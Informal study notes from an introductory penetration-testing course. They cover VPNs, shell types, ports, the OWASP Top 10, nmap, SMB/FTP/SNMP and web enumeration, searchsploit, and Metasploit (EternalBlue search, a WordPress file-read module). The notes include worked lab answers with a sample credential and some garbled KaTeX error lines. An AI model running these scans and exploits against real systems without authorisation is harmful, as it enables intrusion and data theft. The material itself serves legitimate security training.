@@ -1,0 +1,379 @@
+\  
+we should maintain checklists, report templates for various assessment type, and build a finding/vul db. this db can take the form of a spreadsheet or smt more complex and include a finding title, description, impact, remediation advice, and references, so we can utilize next time
+
+\\connecting using VPN
+
+2 main type of remote access VPNs: client-based VPN and SSL VPN. SSL VPN
+
+-SSL VPN  uses the web browser as the VPN client. No require install  can be config to only allow access we based or so on
+
+\\why use A VPN
+
+we use service such as NortVPN or Private Internet Access and connect to a VPN server in another part of our country or another region to obscure our browsing traffice or disguise public IP
+
+\\Connecting to VPN
+
+-$sudo openvpn user.ovpn waiting for Initialization squence completed
+
+after that check whether connected to VPN by $ifconfig check for tun adapter
+
+typing $netstat -rn will sow the network accessible via VPN
+
+\\Common terms
+
+\\What is a shell
+
+on a linux system, the shell is a program that take input the user via the keyboard and passes these commands to the OS to perform a specific function.
+
+Most linux systems use a program called Bash (bourne Again Shell) as a shell program to interact with the OS
+
+-the term "getting a shell" on a box mean that the target host has been exploited, a shell may be obtained by exploiting a web app or network/service vul or obtaining credentials and logging into the target host remotely.
+
+-there are 3 main types of shell connections:
+
+Shell type                Description
+
+Reverse Shell                initiates a connection back to a "listener" on our attack box
+
+Bind shell                "Binds" to a specific port on the target host and waits for a connection from our attack box
+
+Web shell                Run OS command via the web browser, typically not interactive or semi-interactive. it can also be used to run single command(ie leveraging a file upload vul and uploading a PHP script to run a single command
+
+\\What is a Ports
+
+A port can be thought of as a window or door on a house(the house being a remote system) if a window or door is left open or not locked correctly,
+
+-ports are virtual points where network connection begin and end.they are software-based and managed by the host OS. port are associated with a specific process or service and allow computers to diff betw diff traffic types (SSH traffic flows to a diff port than web requests to access a website even though the access request are sent over the same netowrk conn
+
+-each port is assigned a number, and many are standardized across all network-connected devices (though a service can ce config to run on a non-standard port) EX: HTTP massages (web traffic) typically go to port 80, while HTTPS messages goto port 443 unless config otherwise
+
+-port help computer understand how to handle the various types of data they receive
+
+-There are 2 categories of ports, Transmission Control Protocol (TCP), and User Datagram Protocol (UDP).
+
+TCP can significantly affect a real-time system, there are 65535 TCP ports and 65535 diff UDP ports each denoted by a number
+
+| Port(s) | Protocol |
+| --- | --- |
+| `20`/`21` (TCP) | `FTP` |
+| `22` (TCP) | `SSH` |
+| `23` (TCP) | `Telnet` |
+| `25` (TCP) | `SMTP` |
+| `80` (TCP) | `HTTP` |
+| `161` (TCP/UDP) | `SNMP` |
+| `389` (TCP/UDP) | `LDAP` |
+| `443` (TCP) | `SSL`/`TLS` (`HTTPS`) |
+| `445` (TCP) | `SMB` |
+| `3389` (TCP) | `RDP` |
+
+\\What is a Web Server
+
+-is an appllication that runs on the back-end server, which handles all of the HTTP traffic from the client-side browser, routes it to the requests destination pages, and finally responds tothe client-side browser.
+
+- Web server usually run on TCP ports 80 or 443 and are responsible for conn end-users to various parts of the web app in
+
+\\Top 10 vul can affect web app OWASP
+
+&nbsp;
+
+| Number | Category | Description |
+| --- | --- | --- |
+| 1.  | [Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/) | Restrictions are not appropriately implemented to prevent users from accessing other users accounts, viewing sensitive data, accessing unauthorized functionality, modifying data, etc. |
+| 2.  | [Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/) | Failures related to cryptography which often leads to sensitive data exposure or system compromise. |
+| 3.  | [Injection](https://owasp.org/Top10/A03_2021-Injection/) | User-supplied data is not validated, filtered, or sanitized by the application. Some examples of injections are SQL injection, command injection, LDAP injection, etc. |
+| 4.  | [Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/) | These issues happen when the application is not designed with security in mind. |
+| 5.  | [Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) | Missing appropriate security hardening across any part of the application stack, insecure default configurations, open cloud storage, verbose error messages which disclose too much information. |
+| 6.  | [Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/) | Using components (both client-side and server-side) that are vulnerable, unsupported, or out of date. |
+| 7.  | [Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/) | Authentication-related attacks that target user's identity, authentication, and session management. |
+| 8.  | [Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/) | Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs). |
+| 9.  | [Security Logging and Monitoring Failures](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/) | This category is to help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected.. |
+| 10. | [Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/) | SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL). |
+
+\\Basic Tools
+
+SSH, Netcat, Tmux, Vim are essential and are used daily by most information security professionals. although these tools are note intended to be pentest tools. -> must master
+
+\\Using ssh
+
+is a network protocol that runs on port 22 by default and provides user such as system admin a secure way to access a computer remotely.
+
+-SSH can used to remotely access system on the same network. over the internet, facilitate connections to resource in other networks using port forwarding/proxying, and upload download files to and from remote systems
+
+-SSH uses a client-server model, conn a user running an SSH client app such as OpenSSH to an SSH server. While atk a box or during  a real-worl .
+
+-an SSH conn is typically much more stable than a reverse shell conn and can often be used as a jump host to enumerate and atk other host in network, transfer tools, setup persistence, etc
+
+$ssh username@10.10.10.10
+
+\\Using Netcat
+
+Netcat, ncatm or nc is network utility for interacting with TCP/UDP ports. it can be used for many things during a pentest
+
+-primary usage is for conn to shells,
+
+-nc can be used to conn to any listening port and interact with the service running on that port. EX SSH is programed to handle conn over port 22 to send all data and keys. we can conn to TCP port 22 with netcat:
+
+$netcat 10.10.10.10 22 then port 22 will sent us its banner, stating that SSH is running on it. this technique called Banner grabbing. it also help to identify what service is running on particular port.
+
+Netcat pre-installed in ost linux another netcat coded in powershell called PowerCat
+
+Netcat can also be used to transfer files betw machines
+
+-another similar network utility is socat. which has a few features that netcat doesn't support, like forwarding ports and conn to serial devices.
+
+-Socat is very handy utility that should be a part of every pentest tester tool kit. A  standalone binary of socat canbe transferred to a systems after obtaining remote code execution to get a more stable reverse shell conn
+
+\\Using Tmux
+
+-Terminal multiplexers like tmux or screen are utilities for expanding a standard Linux terminal's features, like multi windows within one terminal and jumping betw them.
+
+$tmux  it also support logging
+
+\\Using Vim
+
+Vim is greate tex editor can be use without mousing
+
+$vim /etc/hosts
+
+insert by hit i --insert--
+
+esc -> to get out of insert mode, back to normal mode. when in normal mode use some useful shortcut
+
+| Command | Description |
+| --- | --- |
+| `x` | Cut character |
+| `dw` | Cut word |
+| `dd` | Cut full line |
+| `yw` | Copy word |
+| `yy` | Copy full line |
+| `p` | Paste |
+
+multiple any command to run multiple times by adding a number before it EX 4yw
+
+: for command mode
+
+$test: Apply what you learned in this section to grab the banner of the above server and submit it as the answer. -> $netcat <ip> <port>
+
+\\Service scanning
+
+\\Nmap
+
+-most basic scan $nmap <ip> the result will come soon dueto it don't specify any additional options. nmap will only scan the 1000 most common ports. the scan will show reveals port available
+
+$nmap -sV -sC -p- 10.129.42.253
+
+-the vul https://<ip>/index.php
+
+\\Nmap scripts
+
+-sC will run many useful default scripts against a target but there are cases running a specific script is required
+
+EX: in an assessment scope, we may be asked to audit a large Citrix installation. we could use Nmap script to audit for the servere Citrix NetScaler Vulnerability (CVE-2019-19781), while Nmap also has other scripts to audit a Citrix Installation
+
+$locate scripts/citrix the syntax for running on Nmap script is
+
+$nmap --script <script name> -p<port> <host>
+
+\\\Attacking Network Services
+
+\\Banner Grabbing
+
+$nmap -sV --script=banner <target> is specified. or manually using Netcat
+
+$nc -nv <ip> <port>
+
+$nmap -sV --script=banner -p21 <ip>/24
+
+\\FTP
+
+it is a standard port and often contain interesting data (stm leak Pub directory is available)
+
+$nmap -sC -sV -p21 <ip>
+
+nmanmap-connect to the service using the ftp command-line utility
+
+$ftp -p <ip>
+
+-ftp supports common commands such as cd and ls allow us to download files using the get command. inspection of the downloaded login.txt reveals credentials that we could use to further our access to the system
+
+$cat login.txt
+
+\\SMB (server message block) is a prevalent protocol on Windows machines that provide many vectors for vertical and lateral movement. sensitive data, including credentials, can be network file shares, and some SMB versions maybe vulnerable to RCE exploits such as EternalBlue. is crucial enum this sizeable potential atk surface.
+
+-Nmap has many scripts for enum SMB, such as smb-os-discovery.nse , which will interact with the SMB service to extract the reported OS sersion
+
+$nmap --script smb-os-discovery.nse -p445 <ip>
+
+in case the host runs a legacy window 7 OS. we could conduct further enum to confirm if it is vul to Eternalblue
+
+-the Metasploit Framwork has several modules for EternalBlue that can be used to validate the vul and exploit it
+
+$nmap -A -p445 <ip>
+
+\\Shares SMB allows users and admin to sharefolder and make them accessible remotely by other user. often these shares have file in them that contain sensitive information such as passwords.
+
+- A tool that can enumerate and interact with SMB shares is smbclient. the -L flag specifies we want retrieve a list of available shares on the remoe host, while -N suppresses password prompt
+
+$smbclient -N -L \\\\<ip>
+
+- this reveals the non-default share users let us attempt to connect as the guest user
+
+$smbclient \\\\<ip>\\users
+
+-the ls command resulted in an access denied message,including that guest access is not permitted try again using credentials for the user bob (bob:Welcome1)
+
+$smbclient -U bob \\\\<ip>\\users
+
+we successfully gained access to the users share using credentials and gained access to the interesting file passwords.txt which can be downloaded with the get command
+
+\\SNMP
+
+comm strings provide infor and statistics about a router or device, the manufacturer default comm strings of public and private are often unchanged. in SNMP versions 1 and 2c, access is controlled using a plaintext com strings. if we know the name we can gain access to it.encryption and authentication were only added in SNMP version 3.
+
+$snmpwalk -v 2c -c publicj <ip> 1.3.6.1.2.1.1.5.0
+
+$snmpwalk -v 2c -c private <ip>
+
+a tool such as onesixtyone can be used to bruteforece the comm string names using dir file of common comm strings such as the dict.txt file included in Github repo for the tool
+
+$onesixtyone -c dict.txt <ip>
+
+$test
+
+Perform an Nmap scan of the target. What does Nmap display as the version of the service running on port 8080? => sudo nmap -sV -p<port> <ip>
+
+List the SMB shares available on the target host. Connect to the available share as the bob user. Once connected, access the folder called 'flag' and submit the contents of the flag.txt file.
+
+=>$smbclient -N -L \\\\\\\\&lt;ip&gt; =>$
+
+KaTeX parse error: Expected 'EOF', got '&' at position 25: … -N -L \\\\\\\\&̲lt;ip&gt; =>
+
+KaTeX parse error: Expected 'EOF', got '&' at position 25: … -N -L \\\\\\\\&̲lt;ip> =>
+
+KaTeX parse error: Expected 'EOF', got '&' at position 25: … -N -L \\\\\\\\&̲lt;ip> =>
+
+KaTeX parse error: Expected 'EOF', got '&' at position 25: … -N -L \\\\\\\\&̲lt;ip> =>
+
+smbclient -U bob \\\\STMIP\\users
+
+get \flag\flag.txt
+
+\\\\Web Enumeration
+
+\\Gobuster
+
+after disco a web app. it is always worth checking to see if we can uncover any hidden files or dir on the webserver that are not intended for public access.
+
+use ffuf or GoBuster to perform this dir enumeration.
+
+\\Directory/File Enumeration
+
+Gobuster is a versatile tool that allows for performing DNS, vhost, and directory brute-forcing. the tool has additional functionality . such as enum of public aws s3 buckets
+
+-in this we are dir files brute-forcing modes specified with the switch dir scan using the dirb common.txt wordlist
+
+$gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+
+\\DNS Subdomain enumeration
+
+we can use GoBuster to enum avilable subdomains of a given domain using the dns flag to specify DNS mode,
+
+\\install seclist : $ git clone https://github.com/danielmiessler/SecLists
+
+sudo apt install seclists -y => add a DNS server such as 1.1.1.1 to the /etc/resolv/conf file we will target the domain inlanefreight.com
+
+$gobuster dns -d inlanefreight.com -w /usr/share/seclists/Discovery/DNS/namelist.txt
+
+-this scan reveals several interesting subdomains that could examine further.
+
+\\Web Enumeration Tips
+
+\\Banner grabbing / Web Server Headers
+
+-use cURL to retrieve server header information from the command line cURL
+
+$curl -IL https://www.inlanefreight.com
+
+-another handy tool is EyeWitness, which can be used to take screenshots of target web app fingerprint them and identify possible default credentials
+
+\\\Whatweb
+
+extract the version of web servers, supporting frameworks, and applications using the command-line tool whatweb. This information can help us pinpoint the technologies in use and begin to search for potential vul
+
+$whatweb 10.10.10.121
+
+$whatweb --no-errors 10.10.10.0/24
+
+\\\Certificates
+
+SSL/TLS certificates are another potentially valuable source of information if HTTPS is in use. Browsing to HTTPS://<ip> and viewing the certificates reveals the detail. this potentially be used to conduct a phishing atk
+
+\\Robots.txt
+
+it is common for websites to contain a robots.txt file, whose purpose is to instruct search engine web crawlers such as googlebot which resources can and cannot be accessed for indexing. the robots.txt file can provide valuable infor such as the location of private files and admin pages. EX robots.txt file contain 2 disallowed entries
+
+User-agent: * Disallow: /private Disallow: /upload_files => navigating to https://10.10.10.121/private to get a admin login page
+
+\\Source code it worth to come across
+
+Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag.
+
+=> $gobuster dir -u https://<ip>:<port> -w /usr/share/wordlists/dirb/common.txt -t 40 -q (t: number threat used -q:quitely not display error) => navigate /robot.txt => found disabllow entry
+
+\\\\Public Exploits
+
+once we identify the services running on ports identified from Nmap scan, the first step is to look if any of app/services have any public exploits.
+
+-public exploits can be found for web app and other app running on open ports/ like SSH or ftp
+
+\\Finding Public exploits
+
+-finding exploit by gooogle EX search for windows 7 SMB exploit
+
+-a well-known tool for this purpose is searchsploit, which we can use to search for public vul/exploits for any app
+
+-install it by $sudo apt install exploitdb -y ==> searchsploit openssh 7.2 => searchsploit -x exploits/linux/....
+
+or copy locally $searchsploit -m exploits/linux/remote/....
+
+-or utilize online exploit databases to search for vul, like Exploit DB, Rapid7 DB, or Vulnerability Lab.
+
+\\\Metasploit Primer (metasploit framework MSF)
+
+-it contain many built-in exploits for many public vuls and provides an easy way to use these exploits against vul targets. it contain other feature line:
+
+-running reconaissance scripts to enum remote hosts and compromissed targets
+
+- verification scripts to test the existence of a vul without actually compromising the target
+
+-meterpreter, which is a great tool to connect to shells and run commands on the compromissed targets
+
+-Many post-exploitation and pivoting tools
+
+EX: $msfconsole
+
+msf6$search exploit eternalblue
+
+NOTE: we can search complex filters such as search cve:2009 type:exploit. see all the filter with help search
+
+=>after found one exploit for this service. we use it by copying the full name of it and using USE:
+
+$use exploit/windows/smb/ms17_010_psexec
+
+=>before run exploit, we need to config its option we can use $show options command to view available op
+
+$show options exploit/windows/smb/ms17_010_psexec
+
+&nbsp;
+
+&nbsp;
+\\update
+Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)
+Students first need to navigate to the root webpage of the spawned target machine to discover that it uses the Simple Backup Plugin 2.7.10 plugin for WordPress:
+The first result in Google for searching Simple Backup Plugin 2.7.10 is a guide from Rapid7 that explains how to use the Metasploit module auxiliary/scanner/http/wp_simple_backup_file_read to exploit the directory traversal vulnerability in the plugin:
+$msfconsole -q
+use auxiliary/scanner/http/wp_simple_backup_file_read
+set RHOSTS STMIP
+set RPORT STMPO
+set FILEPATH /flag.txt
+exploit
